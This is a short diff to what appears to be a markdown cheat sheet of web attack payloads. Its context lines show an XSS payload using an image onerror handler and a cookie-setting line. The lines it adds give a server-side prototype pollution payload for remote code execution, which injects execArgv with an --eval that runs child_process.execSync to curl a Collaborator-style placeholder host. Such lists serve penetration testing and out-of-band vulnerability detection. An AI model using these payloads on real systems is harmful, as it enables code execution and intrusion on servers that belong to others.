@@ -243,3 +243,14 @@ document.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";
 ```html
 <img src=x onerror=prompt(1)>
 ```  
+
+>Remote code execution via server-side prototype pollution  
+
+```
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
+    ]
+}
+```  
+
